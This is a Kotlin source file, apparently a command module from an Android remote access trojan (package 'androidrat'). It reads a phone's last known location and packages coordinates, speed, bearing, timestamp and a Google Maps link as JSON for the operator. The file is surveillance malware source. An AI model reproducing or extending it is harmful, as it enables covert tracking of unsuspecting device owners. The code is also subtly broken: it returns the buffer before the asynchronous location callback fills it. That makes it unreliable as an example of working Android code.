package com.nqmgaming.androidrat.command

import android.content.Context
import com.google.android.gms.location.FusedLocationProviderClient

object Location {
    fun getLocation(
        applicationContext: Context,
        fusedLocationClient: FusedLocationProviderClient,
    ): StringBuilder {
        val stringBuilder = StringBuilder()
        fusedLocationClient.lastLocation.addOnSuccessListener { location ->
            if (location != null) {
                // Logic to handle location object
                try {
                    stringBuilder.append("{\n")
                    stringBuilder.append("  \"latitude\": ${location.latitude},\n")
                    stringBuilder.append("  \"longitude\": ${location.longitude},\n")
                    stringBuilder.append("  \"accuracy\": ${location.accuracy},\n")
                    stringBuilder.append("  \"altitude\": ${location.altitude},\n")
                    stringBuilder.append("  \"speed\": ${location.speed},\n")
                    stringBuilder.append("  \"time\": ${location.time},\n")
                    stringBuilder.append("  \"provider\": \"${location.provider}\",\n")
                    stringBuilder.append("  \"bearing\": ${location.bearing},\n")
                    stringBuilder.append("  \"GoogleMap Link\": \"https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}\"\n")
                    stringBuilder.append("}")
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }

        return stringBuilder
    }
}